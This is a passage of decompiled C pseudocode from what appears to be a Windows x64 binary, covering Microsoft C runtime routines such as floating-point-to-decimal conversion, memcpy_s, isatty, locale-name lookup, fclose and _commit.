  {
    *(_DWORD *)(a3 + 4) = 0;
    LODWORD(v10) = strcpy_s(a4, SizeInBytes, "0");
    if ( (_DWORD)v10 != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    goto LABEL_315;
  }
  v11 = __acrt_fp_classify((__int64 *)&X);
  if ( v11 != 0 )
    *(_DWORD *)(a3 + 4) = 1;
  v12 = v11 - 1;
  if ( v12 == 0 )
  {
    LODWORD(v10) = strcpy_s(a4, SizeInBytes, "1#INF");
    if ( (_DWORD)v10 != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    goto LABEL_315;
  }
  v13 = v12 - 1;
  if ( v13 == 0 )
  {
    LODWORD(v10) = strcpy_s(a4, SizeInBytes, "1#QNAN");
    if ( (_DWORD)v10 != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    goto LABEL_315;
  }
  v14 = v13 - 1;
  if ( v14 == 0 )
  {
    LODWORD(v10) = strcpy_s(a4, SizeInBytes, "1#SNAN");
    if ( (_DWORD)v10 != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    goto LABEL_315;
  }
  if ( v14 == 1 )
  {
    LODWORD(v10) = strcpy_s(a4, SizeInBytes, "1#IND");
    if ( (_DWORD)v10 != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    goto LABEL_315;
  }
  X = (__m128i *)(v8 & 0x7FFFFFFFFFFFFFFFLL);
  v15 = v8 & 0x7FFFFFFFFFFFFFFFLL;
  v170 = v8 & 0x7FFFFFFFFFFFFFFFLL;
  v168 = a2 + 1;
  v16 = (v8 & 0x7FFFFFFFFFFFFFFFuLL) >> 52;
  v17 = (v8 & 0xFFFFFFFFFFFFFLL) + (-(__int64)(v16 != 0) & 0x10000000000000LL);
  v18 = (v16 == 0) + 1 + v16 - 1076;
  v19 = log10(*(double *)&v15);
  v21 = ceil(v19);
  Destination[0].m128i_i32[0] = v17;
  v22 = HIDWORD(v17);
  v23 = (((int)v21 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v21 : 0;
  Destination[0].m128i_i32[1] = v22;
  v163 = v23;
  v24 = ((_DWORD)v22 != 0) + 1;
  v174 = v24;
  if ( v18 < 0 )
  {
    if ( v18 != -1022 )
    {
      Source[0].m128i_i64[0] = 0x10000000000000LL;
      v178 = 2;
      if ( (_DWORD)v22 != 0 )
      {
        v58 = 0;
        while ( Source[0].m128i_i32[v58] == Destination[0].m128i_i32[v58] )
        {
          if ( ++v58 == 2 )
          {
            v28 = !_BitScanReverse((unsigned int *)&v59, v22);
            LODWORD(X) = 0;
            if ( v28 )
              v60 = 0;
            else
              v60 = v59 + 1;
            v61 = 32 - v60;
            v62 = 2;
            while ( 1 )
            {
              v63 = v62 >= v24 ? 0 : Destination[0].m128i_i32[v62];
              v64 = v62 - 1;
              v65 = (unsigned int)v64 >= v24 ? 0 : Destination[0].m128i_i32[v64];
              v66 = v62--;
              Destination[0].m128i_i32[v66] = (4 * v63) ^ (v65 >> 30);
              if ( v62 == -1 )
                break;
              v24 = v174;
            }
            v35 = (v61 < 2) + 2;
            v174 = v35;
            sub_140002F60(Source, 0, 4LL * ((unsigned int)(2 - v18) >> 5));
            v42 = ((unsigned int)(2 - v18) >> 5) + 1;
            v20 = 4LL * v42;
            Source[0].m128i_i32[(unsigned int)(2 - v18) >> 5] = 1 << ((2 - v18) & 0x1F);
            goto LABEL_93;
          }
        }
      }
    }
    LODWORD(X) = 0;
    v28 = !_BitScanReverse((unsigned int *)&v67, Destination[0].m128i_u32[(_DWORD)v22 != 0]);
    if ( v28 )
      v68 = 0;
    else
      v68 = v67 + 1;
    v69 = 32 - v68;
    if ( ((_DWORD)v22 != 0) != 114 || (v70 = 1, v69 != 0) )
      v70 = 0;
    if ( v70 != 0 )
    {
      v35 = 0;
      v174 = 0;
    }
    else
    {
      v35 = 114;
      if ( v24 < 0x72 )
        v35 = v24;
      v71 = v35;
      while ( 1 )
      {
        v72 = v71 >= v24 ? 0 : Destination[0].m128i_i32[v71];
        v73 = v71 - 1;
        v74 = (unsigned int)v73 >= v24 ? 0 : Destination[0].m128i_i32[v73];
        v75 = v71--;
        Destination[0].m128i_i32[v75] = (2 * v72) ^ (v74 >> 31);
        if ( v71 == -1 )
          break;
        v24 = v174;
      }
      if ( v69 == 0 )
        ++v35;
      v174 = v35;
    }
    v76 = 1 - v18;
    v77 = (unsigned int)(1 - v18) >> 5;
    v78 = v77;
    sub_140002F60(Source, 0, v78 * 4);
    v42 = v77 + 1;
    Source[0].m128i_i32[v78] = 1 << (v76 & 0x1F);
    v20 = 4LL * (v77 + 1);
LABEL_93:
    v176 = v42;
    v178 = v42;
    if ( v20 != 0 )
    {
      if ( v20 > 0x1CC )
      {
        sub_140002F60(&v177, 0, 0x1CCu);
        *errno() = 34;
        invalid_parameter_noinfo();
      }
      else
      {
        sub_1400036D0(&v177, Source, v20);
      }
      v42 = v176;
    }
  }
  else
  {
    Source[0].m128i_i64[0] = 0x10000000000000LL;
    v178 = 2;
    if ( (_DWORD)v22 != 0 )
    {
      v20 = 0;
      while ( Source[0].m128i_i32[(unsigned int)v20] == Destination[0].m128i_i32[(unsigned int)v20] )
      {
        v20 = (unsigned int)(v20 + 1);
        if ( (_DWORD)v20 == 2 )
        {
          LODWORD(X) = 0;
          v25 = (v18 + 2) & 0x1F;
          v26 = (unsigned int)(v18 + 2) >> 5;
          v27 = (1LL << (32 - ((v18 + 2) & 0x1Fu))) - 1;
          v28 = !_BitScanReverse((unsigned int *)&v29, v22);
          if ( v28 )
            v30 = 0;
          else
            v30 = v29 + 1;
          v31 = 32 - v30;
          v32 = v26 + 2;
          v33 = v25 > v31;
          LOBYTE(v20) = v26 + 2 > 0x73;
          if ( v26 != 113 || (v34 = 1, v25 <= v31) )
            v34 = 0;
          if ( v32 > 0x73 || v34 != 0 )
          {
            v35 = 0;
            v174 = 0;
          }
          else
          {
            v35 = 114;
            if ( v32 < 0x72 )
              v35 = v26 + 2;
            v20 = v35 - v26;
            while ( 1 )
            {
              v36 = (unsigned int)v20 + v26;
              if ( (unsigned int)v36 < v26 )
                break;
              v37 = (unsigned int)v20 >= v24 ? 0 : Destination[0].m128i_i32[v20];
              v38 = (unsigned int)(v20 - 1);
              v39 = (unsigned int)v38 >= v24 ? 0 : Destination[0].m128i_i32[v38];
              v20 = (unsigned int)(v20 - 1);
              Destination[0].m128i_i32[v36] = ((v27 & v37) << v25) | ((~v27 & (unsigned int)v39) >> (32 - v25));
              if ( (_DWORD)v20 + v26 == -1 )
                break;
              v24 = v174;
            }
            for ( i = 0; i != v26; Destination[0].m128i_i32[v41] = 0 )
              v41 = i++;
            if ( v33 )
              ++v35;
            v174 = v35;
          }
          v177.m128i_i32[0] = 4;
          goto LABEL_46;
        }
      }
    }
    LODWORD(X) = 0;
    v43 = (v18 + 1) & 0x1F;
    v44 = (unsigned int)(v18 + 1) >> 5;
    v45 = (1LL << (32 - ((v18 + 1) & 0x1Fu))) - 1;
    v28 = !_BitScanReverse((unsigned int *)&v46, Destination[0].m128i_u32[(_DWORD)v22 != 0]);
    if ( v28 )
      v47 = 0;
    else
      v47 = v46 + 1;
    v48 = 32 - v47;
    v49 = v24 + v44;
    v50 = v43 > v48;
    LOBYTE(v20) = v24 + v44 > 0x73;
    v51 = v24 + v44 == 115 && v43 > v48;
    if ( v49 > 0x73 || v51 )
    {
      v35 = 0;
      v174 = 0;
    }
    else
    {
      v35 = 114;
      if ( v49 < 0x72 )
        v35 = v24 + v44;
      v20 = v35 - v44;
      while ( 1 )
      {
        v52 = (unsigned int)v20 + v44;
        if ( (unsigned int)v52 < v44 )
          break;
        v53 = (unsigned int)v20 >= v24 ? 0 : Destination[0].m128i_i32[v20];
        v54 = (unsigned int)(v20 - 1);
        v55 = (unsigned int)v54 >= v24 ? 0 : Destination[0].m128i_i32[v54];
        Destination[0].m128i_i32[v52] = ((~v45 & (unsigned int)v55) >> (32 - v43)) | ((v45 & v53) << v43);
        v20 = (unsigned int)(v20 - 1);
        if ( (_DWORD)v20 + v44 == -1 )
          break;
        v24 = v174;
      }
      for ( j = 0; j != v44; Destination[0].m128i_i32[v57] = 0 )
        v57 = j++;
      if ( v50 )
        ++v35;
      v174 = v35;
    }
    v177.m128i_i32[0] = 2;
LABEL_46:
    v23 = (((int)v21 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v21 : 0;
    v42 = 1;
    v176 = 1;
    v178 = 1;
    Source[0].m128i_i32[1] = 0;
  }
  if ( v23 >= 0 )
  {
    v79 = v23 / 0xAu;
    v167 = v79;
    v80 = v23 / 0xAu;
    v165 = v79;
    if ( v79 == 0 )
      goto LABEL_183;
    while ( 1 )
    {
      v81 = v80;
      if ( v80 > 0x26 )
        v81 = 38;
      v166 = v81;
      v82 = (unsigned int)(v81 - 1);
      v83 = (unsigned __int8)byte_140014213[4 * v82];
      v84 = 4LL * (unsigned __int8)byte_140014212[4 * v82];
      v178 = v83 + (unsigned __int8)byte_140014212[4 * v82];
      sub_140002F60(Source, 0, v84);
      sub_1400036D0(
        (__m128i *)((char *)Source + v84),
        (const __m128i *)((char *)&unk_140013900 + 4 * (unsigned __int16)word_140014210[2 * (v81 - 1)]),
        4 * v83);
      v85 = v178;
      if ( v178 > 1 )
      {
        if ( v42 > 1 )
        {
          v93 = v42;
          v94 = Source;
          v95 = &v177;
          if ( v178 < v42 )
          {
            v93 = v178;
            v85 = v42;
          }
          else
          {
            v94 = &v177;
          }
          if ( v178 >= v42 )
            v95 = Source;
          v42 = 0;
          v96 = 0;
          X = v95;
          v180 = 0;
          while ( 1 )
          {
            v97 = v94->m128i_u32[v96];
            if ( (_DWORD)v97 != 0 )
            {
              LODWORD(v98) = 0;
              v99 = v96;
              if ( v85 != 0 )
              {
                while ( v99 != 115 )
                {
                  if ( v99 == v42 )
                  {
                    v181.m128i_i32[v99] = 0;
                    v180 = v99 + 1;
                  }
                  v20 = v99;
                  v100 = v95->m128i_u32[v99 - (unsigned int)v96];
                  ++v99;
                  v101 = v181.m128i_u32[v20] + (unsigned int)v98 + v97 * v100;
                  v181.m128i_i32[v20] = v101;
                  v42 = v180;
                  v98 = HIDWORD(v101);
                  if ( v99 - (_DWORD)v96 == v85 )
                    break;
                  v95 = X;
                }
                if ( (_DWORD)v98 != 0 )
                {
                  while ( v99 != 115 )
                  {
                    if ( v99 == v42 )
                    {
                      v181.m128i_i32[v99] = 0;
                      v180 = v99 + 1;
                    }
                    v102 = v99++;
                    v103 = v181.m128i_u32[v102] + (unsigned __int64)(unsigned int)v98;
                    v181.m128i_i32[v102] = v103;
                    v42 = v180;
                    LODWORD(v98) = HIDWORD(v103);
                    if ( HIDWORD(v103) == 0 )
                      goto LABEL_170;
                  }
LABEL_192:
                  v42 = 0;
                  v176 = 0;
LABEL_268:
                  v104 = v163;
LABEL_269:
                  v141 = v169;
                  v142 = v169;
                  if ( v35 != 0 )
                  {
                    LODWORD(v20) = 0;
                    v143 = 0;
                    do
                    {
                      v144 = v143++;
                      v145 = (unsigned int)v20 + 10LL * Destination[0].m128i_u32[v144];
                      Destination[0].m128i_i32[v144] = v145;
                      v20 = HIDWORD(v145);
                    }
                    while ( v143 != v35 );
                    if ( (_DWORD)v20 != 0 )
                    {
                      if ( v174 >= 0x73 )
                      {
                        v178 = 0;
                        v174 = 0;
                        memcpy_s(Destination, 0x1CCu, Source, 0);
                      }
                      else
                      {
                        Destination[0].m128i_i32[v174++] = v20;
                      }
                    }
                  }
                  goto LABEL_276;
                }
              }
LABEL_170:
              if ( v99 == 115 )
                goto LABEL_192;
              v95 = X;
            }
            else if ( (_DWORD)v96 == v42 )
            {
              v181.m128i_i32[v96] = 0;
              v42 = v96 + 1;
              v180 = v96 + 1;
            }
            v96 = (unsigned int)(v96 + 1);
            if ( (_DWORD)v96 == v93 )
            {
              v20 = 4LL * v42;
              v176 = v42;
              if ( v20 != 0 )
              {
                if ( v20 > 0x1CC )
                {
                  sub_140002F60(&v177, 0, 0x1CCu);
                  *errno() = 34;
                  invalid_parameter_noinfo();
                }
                else
                {
                  sub_1400036D0(&v177, &v181, v20);
                }
                v42 = v176;
              }
              v80 = v165;
              v81 = v166;
              goto LABEL_179;
            }
          }
        }
        v90 = v177.m128i_u32[0];
        v20 = 4LL * v178;
        v42 = v178;
        v176 = v178;
        if ( v20 != 0 )
        {
          if ( v20 > 0x1CC )
          {
            sub_140002F60(&v177, 0, 0x1CCu);
            *errno() = 34;
            invalid_parameter_noinfo();
          }
          else
          {
            sub_1400036D0(&v177, Source, v20);
          }
          v42 = v176;
        }
        if ( (_DWORD)v90 == 0 )
        {
LABEL_127:
          v42 = 0;
          goto LABEL_128;
        }
        if ( (_DWORD)v90 == 1 || v42 == 0 )
          goto LABEL_179;
        LODWORD(v20) = 0;
        v91 = 0;
        do
        {
          v92 = (unsigned int)v20 + v90 * v177.m128i_u32[v91];
          v177.m128i_i32[v91] = v92;
          v20 = HIDWORD(v92);
          v91 = (unsigned int)(v91 + 1);
        }
        while ( (_DWORD)v91 != v42 );
      }
      else
      {
        if ( Source[0].m128i_i32[0] == 0 )
          goto LABEL_127;
        if ( Source[0].m128i_i32[0] == 1 || v42 == 0 )
          goto LABEL_179;
        LODWORD(v20) = 0;
        v86 = Source[0].m128i_u32[0];
        v87 = 0;
        do
        {
          v88 = (unsigned int)v20 + v86 * v177.m128i_u32[v87];
          v177.m128i_i32[v87] = v88;
          v20 = HIDWORD(v88);
          v87 = (unsigned int)(v87 + 1);
        }
        while ( (_DWORD)v87 != v42 );
      }
      if ( (_DWORD)v20 == 0 )
        break;
      if ( v176 < 0x73 )
      {
        v177.m128i_i32[v176] = v20;
        v42 = v176 + 1;
LABEL_128:
        v176 = v42;
LABEL_179:
        v89 = 1;
        goto LABEL_180;
      }
      v42 = 0;
      v176 = 0;
      v89 = 0;
LABEL_180:
      if ( v89 == 0 )
        goto LABEL_192;
      v80 -= v81;
      v165 = v80;
      if ( v80 == 0 )
      {
        v79 = v167;
LABEL_183:
        v104 = v163;
        v105 = 10 * v79;
        if ( v163 == v105 )
          goto LABEL_269;
        v106 = dword_1400142A8[v163 - v105 - 1];
        if ( v106 != 0 )
        {
          if ( v106 == 1 || v42 == 0 )
            goto LABEL_269;
          LODWORD(v20) = 0;
          v107 = 0;
          do
          {
            v108 = v107++;
            v109 = (unsigned int)v20 + v106 * (unsigned __int64)v177.m128i_u32[v108];
            v177.m128i_i32[v108] = v109;
            v20 = HIDWORD(v109);
          }
          while ( v107 != v42 );
          if ( HIDWORD(v109) == 0 )
          {
            v42 = v176;
            goto LABEL_269;
          }
          if ( v176 < 0x73 )
          {
            v177.m128i_i32[v176] = HIDWORD(v109);
            v42 = ++v176;
            goto LABEL_269;
          }
        }
        v42 = 0;
        v176 = 0;
        goto LABEL_269;
      }
    }
    v42 = v176;
    goto LABEL_179;
  }
  v110 = -v23;
  v166 = -v23;
  v111 = v110 / 0xA;
  LODWORD(X) = -v23 / 0xAu;
  v112 = (unsigned int)X;
  v165 = v110 / 0xA;
  if ( v110 / 0xA == 0 )
    goto LABEL_256;
  do
  {
    v113 = v112;
    if ( v112 > 0x26 )
      v113 = 38;
    v167 = v113;
    v114 = (unsigned int)(v113 - 1);
    v115 = (unsigned __int8)byte_140014213[4 * v114];
    v116 = 4LL * (unsigned __int8)byte_140014212[4 * v114];
    v178 = v115 + (unsigned __int8)byte_140014212[4 * v114];
    sub_140002F60(Source, 0, v116);
    sub_1400036D0(
      (__m128i *)((char *)Source + v116),
      (const __m128i *)((char *)&unk_140013900 + 4 * (unsigned __int16)word_140014210[2 * (v113 - 1)]),
      4 * v115);
    v117 = v178;
    if ( v178 > 1 )
    {
      if ( v35 > 1 )
      {
        v125 = v35;
        v126 = Source;
        v127 = Destination;
        if ( v178 < v35 )
        {
          v125 = v178;
          v117 = v35;
        }
        else
        {
          v126 = Destination;
        }
        if ( v178 >= v35 )
          v127 = Source;
        v35 = 0;
        v128 = 0;
        v170 = (__int64)v127;
        v180 = 0;
        do
        {
          v129 = v126->m128i_u32[v128];
          if ( (_DWORD)v129 != 0 )
          {
            LODWORD(v130) = 0;
            v131 = v128;
            if ( v117 != 0 )
            {
              while ( v131 != 115 )
              {
                if ( v131 == v35 )
                {
                  v181.m128i_i32[v131] = 0;
                  v180 = v131 + 1;
                }
                v20 = v131;
                v132 = v127->m128i_u32[v131 - (unsigned int)v128];
                ++v131;
                v133 = (unsigned int)v130 + v181.m128i_u32[v20] + v129 * v132;
                v181.m128i_i32[v20] = v133;
                v35 = v180;
                v130 = HIDWORD(v133);
                if ( v131 - (_DWORD)v128 == v117 )
                  break;
                v127 = (__m128i *)v170;
              }
              if ( (_DWORD)v130 != 0 )
              {
                while ( v131 != 115 )
                {
                  if ( v131 == v35 )
                  {
                    v181.m128i_i32[v131] = 0;
                    v180 = v131 + 1;
                  }
                  v134 = v131++;
                  v135 = (unsigned int)v130 + (unsigned __int64)v181.m128i_u32[v134];
                  v181.m128i_i32[v134] = v135;
                  v35 = v180;
                  LODWORD(v130) = HIDWORD(v135);
                  if ( HIDWORD(v135) == 0 )
                    goto LABEL_243;
                }
LABEL_265:
                v141 = v169;
                v104 = v163;
                v142 = v169;
                v174 = 0;
                goto LABEL_276;
              }
            }
LABEL_243:
            if ( v131 == 115 )
              goto LABEL_265;
            v127 = (__m128i *)v170;
          }
          else if ( (_DWORD)v128 == v35 )
          {
            v181.m128i_i32[v128] = 0;
            v35 = v128 + 1;
            v180 = v128 + 1;
          }
          v128 = (unsigned int)(v128 + 1);
        }
        while ( (_DWORD)v128 != v125 );
        v20 = 4LL * v35;
        v174 = v35;
        if ( v20 != 0 )
        {
          if ( v20 > 0x1CC )
          {
            sub_140002F60(Destination, 0, 0x1CCu);
            *errno() = 34;
            invalid_parameter_noinfo();
          }
          else
          {
            sub_1400036D0(Destination, &v181, v20);
          }
          v35 = v174;
        }
        v112 = v165;
        v113 = v167;
        goto LABEL_252;
      }
      v122 = Destination[0].m128i_u32[0];
      v20 = 4LL * v178;
      v35 = v178;
      v174 = v178;
      if ( v20 != 0 )
      {
        if ( v20 > 0x1CC )
        {
          sub_140002F60(Destination, 0, 0x1CCu);
          *errno() = 34;
          invalid_parameter_noinfo();
        }
        else
        {
          sub_1400036D0(Destination, Source, v20);
        }
        v35 = v174;
      }
      if ( (_DWORD)v122 == 0 )
      {
LABEL_200:
        v35 = 0;
        goto LABEL_201;
      }
      if ( (_DWORD)v122 == 1 || v35 == 0 )
        goto LABEL_252;
      LODWORD(v20) = 0;
      v123 = 0;
      do
      {
        v124 = (unsigned int)v20 + v122 * Destination[0].m128i_u32[v123];
        Destination[0].m128i_i32[v123] = v124;
        v20 = HIDWORD(v124);
        v123 = (unsigned int)(v123 + 1);
      }
      while ( (_DWORD)v123 != v35 );
    }
    else
    {
      if ( Source[0].m128i_i32[0] == 0 )
        goto LABEL_200;
      if ( Source[0].m128i_i32[0] == 1 || v35 == 0 )
        goto LABEL_252;
      LODWORD(v20) = 0;
      v118 = Source[0].m128i_u32[0];
      v119 = 0;
      do
      {
        v120 = (unsigned int)v20 + v118 * Destination[0].m128i_u32[v119];
        Destination[0].m128i_i32[v119] = v120;
        v20 = HIDWORD(v120);
        v119 = (unsigned int)(v119 + 1);
      }
      while ( (_DWORD)v119 != v35 );
    }
    if ( (_DWORD)v20 == 0 )
    {
      v35 = v174;
      goto LABEL_252;
    }
    if ( v174 >= 0x73 )
    {
      v35 = 0;
      v174 = 0;
      v121 = 0;
      goto LABEL_253;
    }
    Destination[0].m128i_i32[v174] = v20;
    v35 = v174 + 1;
LABEL_201:
    v174 = v35;
LABEL_252:
    v121 = 1;
LABEL_253:
    if ( v121 == 0 )
      goto LABEL_265;
    v112 -= v113;
    v165 = v112;
  }
  while ( v112 != 0 );
  v110 = v166;
  v111 = (unsigned int)X;
LABEL_256:
  v136 = v110 - 10 * v111;
  if ( v136 == 0 )
    goto LABEL_268;
  v137 = dword_1400142A8[v136 - 1];
  if ( v137 == 0 )
    goto LABEL_265;
  if ( v137 == 1 || v35 == 0 )
    goto LABEL_268;
  LODWORD(v20) = 0;
  v138 = 0;
  do
  {
    v139 = v138++;
    v140 = (unsigned int)v20 + v137 * (unsigned __int64)Destination[0].m128i_u32[v139];
    Destination[0].m128i_i32[v139] = v140;
    v20 = HIDWORD(v140);
  }
  while ( v138 != v35 );
  if ( HIDWORD(v140) == 0 )
  {
    v35 = v174;
    goto LABEL_268;
  }
  v104 = v163;
  if ( v174 < 0x73 )
  {
    Destination[0].m128i_i32[v174] = HIDWORD(v140);
    v35 = ++v174;
    goto LABEL_269;
  }
  v141 = v169;
  v142 = v169;
  v174 = 0;
LABEL_276:
  v146 = __crt_strtox::divide(
           (__crt_strtox *)&v174,
           (struct __crt_strtox::big_integer *)&v176,
           (const struct __crt_strtox::big_integer *)v20);
  if ( v146 == 10 )
  {
    ++v104;
    *v141 = 49;
    v142 = v141 + 1;
    if ( v42 != 0 )
    {
      LODWORD(v147) = 0;
      v148 = 0;
      do
      {
        v149 = v148++;
        v150 = (unsigned int)v147 + 10LL * v177.m128i_u32[v149];
        v177.m128i_i32[v149] = v150;
        v147 = HIDWORD(v150);
      }
      while ( v148 != v42 );
      if ( (_DWORD)v147 != 0 )
      {
        if ( v176 >= 0x73 )
        {
          v178 = 0;
          v176 = 0;
          memcpy_s(&v177, 0x1CCu, Source, 0);
        }
        else
        {
          v177.m128i_i32[v176++] = v147;
        }
      }
    }
  }
  else if ( v146 != 0 )
  {
    v142 = v141 + 1;
    *v141 = v146 + 48;
  }
  else
  {
    --v104;
  }
  v151 = v168;
  *(_DWORD *)(v173 + 4) = v104;
  if ( v104 >= 0 && v151 <= 0x7FFFFFFF )
    v151 += v104;
  LODWORD(v10) = SizeInBytes - 1;
  v152 = v151;
  if ( SizeInBytes - 1 < v151 )
    v152 = SizeInBytes - 1;
  for ( k = &v141[v152]; v142 != k; v142 += v10 )
  {
    v154 = v174;
    if ( v174 == 0 )
      break;
    LODWORD(v155) = 0;
    v156 = 0;
    do
    {
      v157 = v156++;
      v158 = (unsigned int)v155 + 1000000000LL * Destination[0].m128i_u32[v157];
      Destination[0].m128i_i32[v157] = v158;
      v155 = (const struct __crt_strtox::big_integer *)HIDWORD(v158);
    }
    while ( v156 != v154 );
    if ( HIDWORD(v158) != 0 )
    {
      if ( v174 >= 0x73 )
      {
        v178 = 0;
        v174 = 0;
        memcpy_s(Destination, 0x1CCu, Source, 0);
      }
      else
      {
        Destination[0].m128i_i32[v174++] = HIDWORD(v158);
      }
    }
    v159 = __crt_strtox::divide((__crt_strtox *)&v174, (struct __crt_strtox::big_integer *)&v176, v155);
    for ( m = 8; m != -1; --m )
    {
      v161 = v159 % 0xA + 48;
      v159 /= 0xAu;
      if ( (int)k - (int)v142 >= m )
        v142[m] = v161;
    }
    v10 = k - v142;
    if ( k - v142 > 9 )
      v10 = 9;
  }
  *v142 = 0;
LABEL_315:
  if ( v172 != 0 )
    LODWORD(v10) = fesetenv(&Env);
  return v10;
}


// ===== memcpy_s @ 0x14000dbfc size=0x87 =====
static errno_t __cdecl memcpy_s(
        void *const Destination,
        const rsize_t DestinationSize,
        const void *const Source,
        const rsize_t SourceSize)
{
  int *v8; // rax
  errno_t v9; // ebx

  if ( SourceSize == 0 )
    return 0;
  if ( Destination != nullptr )
  {
    if ( Source != nullptr && DestinationSize >= SourceSize )
    {
      sub_1400036D0((__m128i *)Destination, (const __m128i *)Source, SourceSize);
      return 0;
    }
    sub_140002F60((__m128i *)Destination, 0, DestinationSize);
    if ( Source != nullptr )
    {
      if ( DestinationSize < SourceSize )
      {
        v8 = errno();
        v9 = 34;
        goto LABEL_5;
      }
      return 22;
    }
  }
  v8 = errno();
  v9 = 22;
LABEL_5:
  *v8 = v9;
  invalid_parameter_noinfo();
  return v9;
}


// ===== _isatty @ 0x14000dc84 size=0x5f =====
int __cdecl isatty(int FileHandle)
{
  if ( FileHandle == -2 )
  {
    *errno() = 9;
  }
  else
  {
    if ( FileHandle >= 0 && FileHandle < (unsigned int)dword_14001D750 )
      return *(_BYTE *)(qword_14001D350[(__int64)FileHandle >> 6] + ((unsigned __int64)(FileHandle & 0x3F) << 6) + 56)
           & 0x40;
    *errno() = 9;
    invalid_parameter_noinfo();
  }
  return 0;
}


// ===== ?GetTableIndexFromLocaleName@@YAHPEB_W@Z @ 0x14000dce4 size=0xc7 =====
__int64 __fastcall GetTableIndexFromLocaleName(const wchar_t *a1)
{
  int v1; // r10d
  int v3; // r11d
  __int64 v4; // rbx
  __int64 v5; // r8
  char *v6; // r9
  signed __int64 v7; // rdi
  unsigned __int16 v8; // dx
  unsigned __int16 v9; // cx
  int v10; // ecx

  v1 = 0;
  v3 = 227;
  while ( 1 )
  {
    v4 = 85;
    v5 = (v3 + v1) / 2;
    v6 = (char *)*(&off_140015D50 + 2 * v5);
    v7 = (char *)a1 - v6;
    do
    {
      v8 = *(_WORD *)&v6[v7];
      if ( (unsigned __int16)(v8 - 65) <= 0x19u )
        v8 += 32;
      v9 = *(_WORD *)v6;
      if ( (unsigned __int16)(*(_WORD *)v6 - 65) <= 0x19u )
        v9 += 32;
      v6 += 2;
      --v4;
    }
    while ( v4 != 0 && v8 != 0 && v8 == v9 );
    v10 = v8 - v9;
    if ( v10 == 0 )
      break;
    if ( v10 >= 0 )
      v1 = v5 + 1;
    else
      v3 = v5 - 1;
    if ( v1 > v3 )
      return 0xFFFFFFFFLL;
  }
  return *((unsigned int *)&off_140015D50 + 4 * v5 + 2);
}


// ===== __crtDownlevelLocaleNameToLCID @ 0x14000ddac size=0x32 =====
__int64 __fastcall _crtDownlevelLocaleNameToLCID(const wchar_t *a1)
{
  int TableIndexFromLocaleName; // eax

  if ( a1 != nullptr
    && (TableIndexFromLocaleName = GetTableIndexFromLocaleName(a1)) >= 0
    && (unsigned __int64)TableIndexFromLocaleName < 0xE4 )
  {
    return *((unsigned int *)&unk_1400142F0 + 4 * TableIndexFromLocaleName);
  }
  else
  {
    return 0;
  }
}


// ===== _fclose_nolock @ 0x14000dde0 size=0x83 =====
int __cdecl fclose_nolock(FILE *Stream)
{
  int v3; // edi
  unsigned int v4; // eax
  char *tmpfname; // rcx

  if ( Stream != nullptr )
  {
    v3 = -1;
    if ( (HIDWORD(Stream->_base) & 0x2000) != 0 )
    {
      v3 = _acrt_stdio_flush_nolock((__int64)Stream);
      _acrt_stdio_free_buffer_nolock((__int64)Stream);
      v4 = fileno(Stream);
      if ( (int)sub_14000F734(v4) >= 0 )
      {
        tmpfname = Stream->_tmpfname;
        if ( tmpfname != nullptr )
        {
          free_base(tmpfname);
          Stream->_tmpfname = nullptr;
        }
      }
      else
      {
        v3 = -1;
      }
    }
    __acrt_stdio_free_stream(Stream);
    return v3;
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return -1;
  }
}


// ===== fclose @ 0x14000de64 size=0x69 =====
int __cdecl fclose(FILE *Stream)
{
  int v3; // edi

  if ( Stream == nullptr )
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return -1;
  }
  if ( (HIDWORD(Stream->_base) & 0x1000) != 0 )
  {
    __acrt_stdio_free_stream(Stream);
    return -1;
  }
  sub_140005338((__int64)Stream);
  v3 = fclose_nolock(Stream);
  sub_140005344((__int64)Stream);
  return v3;
}


// ===== ??$?RV_lambda_b521505b218e5242e90febf6bfebc422_@@AEAV_lambda_6978c1fb23f02e42e1d9e99668cc68aa_@@V_lambda_314360699dd331753a4119843814e9a7_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_b521505b218e5242e90febf6bfebc422_@@AEAV_lambda_6978c1fb23f02e42e1d9e99668cc68aa_@@$$QEAV_lambda_314360699dd331753a4119843814e9a7_@@@Z @ 0x14000ded0 size=0x8c =====
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_b521505b218e5242e90febf6bfebc422_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_314360699dd331753a4119843814e9a7_>(
        __int64 a1,
        int *a2,
        int **a3,
        int *a4)
{
  void *osfhandle; // rax
  unsigned int v7; // ebx
  unsigned int *v8; // rbx

  sub_14000AD6C(*a2);
  if ( (*(_BYTE *)(qword_14001D350[(__int64)**a3 >> 6] + ((unsigned __int64)(**a3 & 0x3F) << 6) + 56) & 1) == 0 )
    goto LABEL_4;
  osfhandle = (void *)get_osfhandle(**a3);
  v7 = 0;
  if ( !FlushFileBuffers(osfhandle) )
  {
    v8 = _doserrno();
    *v8 = GetLastError();
LABEL_4:
    *errno() = 9;
    v7 = -1;
  }
  sub_14000AD90(*a4);
  return v7;
}


// ===== _commit @ 0x14000df5c size=0x91 =====
int __cdecl commit(int FileHandle)
{
  int *v2; // [rsp+20h] [rbp-18h] BYREF
  int v3; // [rsp+40h] [rbp+8h] BYREF
  char v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h] BYREF
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = FileHandle;
  if ( FileHandle == -2 )
  {
    *errno() = 9;
  }
  else
  {
    if ( FileHandle >= 0
      && FileHandle < (unsigned int)dword_14001D750
      && (*(_BYTE *)(qword_14001D350[(__int64)FileHandle >> 6] + ((unsigned __int64)(FileHandle & 0x3F) << 6) + 56) & 1) != 0 )
    {
      v5 = FileHandle;
      v6 = FileHandle;
      v2 = &v3;
      return __crt_seh_guarded_call<int>::operator()<_lambda_b521505b218e5242e90febf6bfebc422_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_314360699dd331753a4119843814e9a7_>(
               (__int64)&v4,
               &v6,
               &v2,
               &v5);
    }
